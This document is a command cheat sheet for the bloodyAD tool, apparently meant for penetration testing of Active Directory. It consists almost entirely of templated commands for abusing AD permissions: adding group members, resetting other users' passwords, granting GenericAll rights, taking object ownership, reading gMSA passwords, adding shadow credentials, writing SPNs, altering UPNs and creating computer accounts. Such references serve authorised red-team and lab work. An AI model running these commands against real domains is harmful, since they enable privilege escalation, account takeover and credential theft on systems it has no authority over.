# bloodyAD

% Active directory, bloodyAD
## bloodyAD - Retrieve User Information
```bash
bloodyAD --host <dc> -d <domain> -u '<username>' -p '<password>' get object <target_username>
```

## bloodyAD - Add User To Group(AddMember)
```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' add groupMember <group_name> <member_to_add>
```

## bloodyAD - Change Password
```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' set password <target_username> '<new_password>'
```

## bloodyAD - Give User GenericAll Rights
```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' add genericAll <DN> <target_username>
```

## bloodyAD - WriteOwner
```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' set owner '<target_group>' <target_username>
```

## bloodyAD - ReadGMSAPassword
```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' get object <target_username> --attr msDS-ManagedPassword
```

## bloodyAD - Enable a Disabled Account
```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' remove uac <target_username> -f ACCOUNTDISABLE
```

## bloodyAD - Modify UPN
```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' set object <old_upn> userPrincipalName -v <new_upn>
```

## bloodyAD - Enumerate MachineAccountQuota
```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' get object '<DC=dc,DC=dc>' --attr ms-DS-MachineAccountQuota
```

## bloodyAD - Find Writable Attributes
```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' get writable --detail
```

## bloodyAD - Shadow Credentials
```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' add shadowCredentials <target>
```

## bloodyAD - WriteSPN
```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' set object <target> servicePrincipalName -v '<domain>/<user>'
```

## bloodyAD - Find Deleted Objects
```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' get writable --include-del
```

## bloodyAD - Restore a deleted object
```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' -k set restore <user_to_restore>
```

## bloodyAD - Create a new computer account
```bash
bloodyAD --host '<dc>' -d '<domain>' -u '<username>' -p '<password>' add computer <computer_name> <computer_password>
```